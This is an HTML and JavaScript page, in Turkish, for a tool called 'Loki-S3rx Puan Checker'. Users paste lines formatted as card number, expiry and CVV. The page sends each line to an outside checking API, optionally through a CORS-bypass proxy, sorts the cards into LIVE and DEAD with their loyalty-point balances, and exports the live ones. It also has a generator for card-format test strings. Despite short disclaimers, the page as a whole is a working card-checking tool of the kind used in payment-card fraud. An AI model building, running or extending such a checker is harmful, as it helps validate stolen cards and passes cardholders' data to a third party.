<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Loki-S3rx Puan Checker</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
  :root{
    --bg1:#071020;
    --card: rgba(255,255,255,0.03);
    --accent1:#6ae0ff;
    --accent2:#b46bff;
    --muted:#9fb4c8;
    --good:#34e89e;
    --bad:#ff6b6b;
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Arial;background:var(--bg1);color:#eef6fb}

  /* subtle animated rain background (CSS) */
  .bg {
    position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;
    background: linear-gradient(180deg,#071426 0%, #021026 60%, #000814 100%);
  }
  .raindrop {
    position:absolute;
    top:-10%;
    width:2px;height:60vh;
    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.08));
    opacity:0.06;
    transform:skewX(-12deg);
    animation: fall linear infinite;
  }
  @keyframes fall { to { transform: translateY(120vh) skewX(-12deg); } }

  /* layout */
  .wrap{position:relative;z-index:2;max-width:1200px;margin:28px auto;padding:20px}
  .topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
  .brand{display:flex;align-items:center;gap:12px}
  .logo{width:56px;height:56px;border-radius:10px;background:linear-gradient(135deg,var(--accent1),var(--accent2));display:flex;align-items:center;justify-content:center;font-weight:700;color:#021020}
  h1{margin:0;font-size:20px}
  p.sub{margin:0;color:var(--muted);font-size:13px}

  .layout{display:grid;grid-template-columns:260px 1fr;gap:18px}
  @media(max-width:900px){ .layout{grid-template-columns:1fr} .sidebar{position:relative} .topbar{flex-direction:column;align-items:flex-start} }

  /* sidebar */
  .sidebar{background:var(--card);border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.02)}
  .menu{display:flex;flex-direction:column;gap:8px}
  .menu button{background:transparent;border:0;padding:10px 12px;border-radius:8px;text-align:left;color:#d6f1ff;cursor:pointer;font-weight:600}
  .menu button.active{background:linear-gradient(90deg, rgba(106,224,255,0.06), rgba(180,107,255,0.04));box-shadow:inset 0 0 12px rgba(0,0,0,0.2)}

  /* main card */
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.12));border-radius:12px;padding:18px;border:1px solid rgba(255,255,255,0.03)}
  label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px}
  textarea,input{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:rgba(0,0,0,0.25);color:inherit;font-family:monospace}
  textarea{min-height:140px;resize:vertical}
  .controls{display:flex;gap:8px;margin-top:10px}
  .btn{padding:10px 14px;border-radius:10px;border:0;background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#021020;font-weight:700;cursor:pointer}
  .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted)}
  .small{font-size:13px;color:var(--muted)}

  .stats{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
  .stat{background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;min-width:120px;text-align:center}

  .lists{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
  .list{background:rgba(0,0,0,0.25);border-radius:8px;padding:10px;min-height:220px;overflow:auto}
  .item{display:flex;justify-content:space-between;padding:8px;border-radius:6px;margin-bottom:8px;background:rgba(255,255,255,0.02)}
  .item.live{border-left:4px solid var(--good)}
  .item.dead{border-left:4px solid var(--bad)}
  .progress{height:10px;background:rgba(255,255,255,0.04);border-radius:999px;overflow:hidden;margin-top:10px}
  .progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent1),var(--accent2));transition:width 300ms ease}

  .footer{margin-top:14px;color:var(--muted);font-size:13px;text-align:center}

  /* copy/download controls row */
  .actions{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
</style>
</head>
<body>
<div class="bg" aria-hidden>
  <!-- generate raindrops with JS for variety -->
</div>

<div class="wrap">
  <div class="topbar">
    <div class="brand">
      <div class="logo">CHK</div>
      <div>
        <h1>Loki-S3rx Puan Checker</h1>
        <p class="sub">Puan sorgulama arayüzü — sadece izinli verilerle kullan.</p>
      </div>
    </div>

    <div class="small">Proxy: <label><input id="useProxy" type="checkbox" checked/> CORS bypass</label></div>
  </div>

  <div class="layout">
    <aside class="sidebar">
      <div class="menu">
        <button id="tabCheck" class="active">Puan Checker</button>
        <button id="tabGen">(Test) Generator</button>
        <button id="tabLogs">Loglar</button>
        <div style="height:8px"></div>
        <button id="btnClear" class="ghost btn">Temizle Tüm</button>
      </div>
    </aside>

    <main>
      <!-- CHECKER CARD -->
      <section id="panelCheck" class="card">
        <label>Veriler (her satıra bir öğe, ör: <code>4743401027803869|11|28|000</code>)</label>
        <textarea id="inputData" placeholder="Her satıra 1 puan sorgusu yaz..."></textarea>

        <div class="controls">
          <button id="startBtn" class="btn">Kontrol Başlat</button>
          <button id="stopBtn" class="btn ghost">Durdur</button>
          <button id="copyLiveBtn" class="btn ghost">Live Kopyala</button>
          <button id="downloadJson" class="btn ghost">İndir (.json)</button>
        </div>

        <div class="stats" aria-live="polite">
          <div class="stat">Kontrol: <span id="checked">0</span>/<span id="total">0</span></div>
          <div class="stat">LIVE: <span id="live">0</span></div>
          <div class="stat">DEAD: <span id="dead">0</span></div>
          <div class="stat">Toplam Puan: <span id="sum">0.00</span> TL</div>
        </div>

        <div class="progress"><i id="bar"></i></div>

        <div class="lists">
          <div class="list" id="liveList"><div class="small">Live sonuçlar</div></div>
          <div class="list" id="deadList"><div class="small">Dead sonuçlar</div></div>
        </div>

        <div class="actions">
          <button id="downloadTxt" class="btn ghost">Sonuçları .txt indir</button>
          <div style="flex:1"></div>
          <div class="small">Ayarlarda gecikme ve proxy bulunur.</div>
        </div>
      </section>

      <!-- GENERATOR (SAFE TEST) -->
      <section id="panelGen" class="card" style="display:none;margin-top:16px">
        <label>Test Prefix (ör: TEST-595959)</label>
        <input id="genPrefix" placeholder="TEST-595959">
        <label>Ay/Yıl (opsiyonel)</label>
        <input id="genExp" placeholder="11/28 or leave empty">
        <label>CVV (opsiyonel)</label>
        <input id="genCvv" placeholder="000 or leave empty">
        <label>Adet</label>
        <input id="genCount" type="number" value="10">
        <div style="height:8px"></div>
        <div class="controls">
          <button id="genBtn" class="btn">Üret (TEST)</button>
          <button id="genCopy" class="btn ghost">Kopyala</button>
        </div>
        <textarea id="genOut" placeholder="Üretilen test veriler burada..." rows="6" style="margin-top:10px"></textarea>
        <div class="small" style="margin-top:8px;color:var(--muted)">Not: Bu modül gerçek CC oluşturmaz. Sadece test/placeholder ID üretir.</div>
      </section>

      <!-- LOGS -->
      <section id="panelLogs" class="card" style="display:none;margin-top:16px">
        <h3 style="margin:0 0 8px 0">API Loglar</h3>
        <div id="logBox" class="list" style="min-height:120px"></div>
        <div style="margin-top:8px" class="small">Loglar tarayıcı oturumunda tutulur.</div>
      </section>

      <div class="footer">Built with ❤️ — Loki-S3rx Checker UI</div>
    </main>
  </div>
</div>

<script>
/* ========== Rain background generator ========== */
const bg = document.querySelector('.bg');
function makeRain(count=36){
  for(let i=0;i<count;i++){
    const d = document.createElement('div');
    d.className='raindrop';
    d.style.left = Math.random()*100 + '%';
    d.style.opacity = (Math.random()*0.06 + 0.02).toFixed(3);
    d.style.height = (40 + Math.random()*80) + 'vh';
    d.style.animationDuration = (3 + Math.random()*4) + 's';
    d.style.animationDelay = (Math.random()*-8) + 's';
    bg.appendChild(d);
  }
}
makeRain(40);

/* ========== UI panel switching ========== */
const tabCheck = document.getElementById('tabCheck');
const tabGen = document.getElementById('tabGen');
const tabLogs = document.getElementById('tabLogs');
const panelCheck = document.getElementById('panelCheck');
const panelGen = document.getElementById('panelGen');
const panelLogs = document.getElementById('panelLogs');

tabCheck.addEventListener('click', ()=>{ panelCheck.style.display='block'; panelGen.style.display='none'; panelLogs.style.display='none'; tabCheck.classList.add('active'); tabGen.classList.remove('active'); tabLogs.classList.remove('active');});
tabGen.addEventListener('click', ()=>{ panelCheck.style.display='none'; panelGen.style.display='block'; panelLogs.style.display='none'; tabGen.classList.add('active'); tabCheck.classList.remove('active'); tabLogs.classList.remove('active');});
tabLogs.addEventListener('click', ()=>{ panelCheck.style.display='none'; panelGen.style.display='none'; panelLogs.style.display='block'; tabLogs.classList.add('active'); tabGen.classList.remove('active'); tabCheck.classList.remove('active');});

/* ========== Elements ========== */
const inputData = document.getElementById('inputData');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const liveList = document.getElementById('liveList');
const deadList = document.getElementById('deadList');
const checkedEl = document.getElementById('checked');
const totalEl = document.getElementById('total');
const liveEl = document.getElementById('live');
const deadEl = document.getElementById('dead');
const sumEl = document.getElementById('sum');
const bar = document.getElementById('bar');
const useProxy = document.getElementById('useProxy');
const logBox = document.getElementById('logBox');
const copyLiveBtn = document.getElementById('copyLiveBtn');
const downloadJson = document.getElementById('downloadJson');
const downloadTxt = document.getElementById('downloadTxt');
const btnClear = document.getElementById('btnClear');

/* ========== State ========== */
let abort = false;
let results = {live:[], dead:[]};
let stats = {checked:0, total:0, live:0, dead:0, sum:0};

/* small helpers */
function pushLog(txt){
  const el = document.createElement('div');
  el.textContent = `[${new Date().toLocaleTimeString()}] ${txt}`;
  el.style.padding='6px';
  el.style.borderBottom='1px dashed rgba(255,255,255,0.03)';
  logBox.prepend(el);
}
function formatNumber(n){ return Number(n).toFixed(2).replace('.',','); }
function setProgress(){
  checkedEl.textContent = stats.checked;
  totalEl.textContent = stats.total;
  liveEl.textContent = stats.live;
  deadEl.textContent = stats.dead;
  sumEl.textContent = formatNumber(stats.sum);
  const pct = stats.total? Math.round((stats.checked/stats.total)*100):0;
  bar.style.width = pct + '%';
}

/* parse numeric from text */
function tryParseNumber(v){
  if(!v) return null;
  const m = String(v).replace(',','.').match(/-?\d+(?:\.\d+)?/);
  return m? parseFloat(m[0]) : null;
}

/* core check function (single) */
async function fetchItem(item){
  try{
    const api = 'https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=' + encodeURIComponent(item);
    const final = useProxy.checked? ('https://api.allorigins.win/raw?url=' + encodeURIComponent(api)) : api;
    const r = await fetch(final);
    const txt = await r.text();
    return {raw: txt};
  }catch(e){
    return {error: String(e)};
  }
}

/* process list sequentially (safe) */
async function processList(items){
  abort = false;
  results = {live:[], dead:[]};
  stats = {checked:0,total:items.length,live:0,dead:0,sum:0};
  liveList.innerHTML=''; deadList.innerHTML=''; logBox.innerHTML='';
  setProgress();
  startBtn.disabled = true; stopBtn.disabled = false;
  pushLog('Kontrol başladı — toplam ' + items.length);

  for(const it of items){
    if(abort) { pushLog('Kullanıcı tarafından durduruldu'); break; }
    stats.checked++;
    setProgress();
    // small delay to avoid hammering
    await new Promise(r=>setTimeout(r, 300));

    const res = await fetchItem(it);
    if(res.error){
      deadList.insertAdjacentHTML('afterbegin', `<div class="item dead">❌ ${it} → API HATA</div>`);
      results.dead.push({item,raw:res.error});
      stats.dead++;
      pushLog(`Hata ${it} — ${res.error}`);
    } else {
      const raw = res.raw || '';
      // attempt to detect points (heuristic)
      const points = tryParseNumber(raw) || 0;
      const isLive = /live|ok|success|puan|bakiye|\d+[.,]?\d*\s*tl/i.test(raw) || points>0;

      if(isLive){
        results.live.push({item,raw,points});
        liveList.insertAdjacentHTML('afterbegin', `<div class="item live"><div><strong>${item}</strong><div class="small">${String(raw).slice(0,80)}</div></div><div><strong>${points.toFixed(2)} TL</strong></div></div>`);
        stats.live++; stats.sum += Number(points);
        pushLog(`LIVE ${item} (${points} TL)`);
      } else {
        results.dead.push({item,raw,points});
        deadList.insertAdjacentHTML('afterbegin', `<div class="item dead">❌ ${item} → ${String(raw).slice(0,80)}</div>`);
        stats.dead++;
        pushLog(`DEAD ${item}`);
      }
    }
    setProgress();
  }

  startBtn.disabled = false; stopBtn.disabled = true;
  pushLog('Kontrol tamamlandı');
}

/* ========== UI wiring ========== */
startBtn.addEventListener('click', ()=> {
  const raw = inputData.value.trim();
  if(!raw){ alert('En az bir satır gir'); return; }
  const items = raw.split(/\r?\n+/).map(s=>s.trim()).filter(s=>s);
  processList(items);
});
stopBtn.addEventListener('click', ()=>{ abort = true; });

copyLiveBtn.addEventListener('click', ()=>{
  if(!results.live.length){ alert('Live yok'); return; }
  const txt = results.live.map(r=>r.item).join('\n');
  navigator.clipboard.writeText(txt).then(()=>alert('Live kopyalandı'));
});

downloadJson.addEventListener('click', ()=>{
  const blob = new Blob([JSON.stringify(results,null,2)],{type:'application/json'});
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'results.json'; a.click();
});

downloadTxt.addEventListener('click', ()=>{
  const lines = [];
  for(const l of results.live) lines.push(`${l.item}|${(l.points||0).toFixed(2)}`);
  for(const d of results.dead) lines.push(`${d.item}|0`);
  const blob = new Blob([lines.join('\n')],{type:'text/plain'});
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'results.txt'; a.click();
});

btnClear.addEventListener('click', ()=>{
  if(!confirm('Tüm alanlar temizlensin mi?')) return;
  inputData.value=''; liveList.innerHTML=''; deadList.innerHTML=''; logBox.innerHTML=''; results={live:[],dead:[]}; stats={checked:0,total:0,live:0,dead:0,sum:0}; setProgress();
});

/* Generator handlers (safe test IDs) */
document.getElementById('genBtn').addEventListener('click', ()=>{
  const prefix = document.getElementById('genPrefix').value.trim() || 'TEST';
  const exp = document.getElementById('genExp').value.trim();
  const cvv = document.getElementById('genCvv').value.trim();
  const count = parseInt(document.getElementById('genCount').value.trim()) || 10;
  let out = '';
  for(let i=0;i<count;i++){
    const id = prefix + '-' + Math.random().toString(36).substr(2,10).toUpperCase();
    const e = exp || (String(Math.floor(Math.random()*12)+1).padStart(2,'0') + '/' + String(Math.floor(Math.random()*6)+25));
    const c = cvv || String(Math.floor(Math.random()*900)+100);
    out += `${id}|${e}|${c}\n`;
  }
  document.getElementById('genOut').value = out;
});

/* Initialize small UI state */
setProgress();
pushLog('Arayüz hazır — proxy aktif: ' + (useProxy.checked ? 'evet' : 'hayır'));
</script>
</body>
</html>
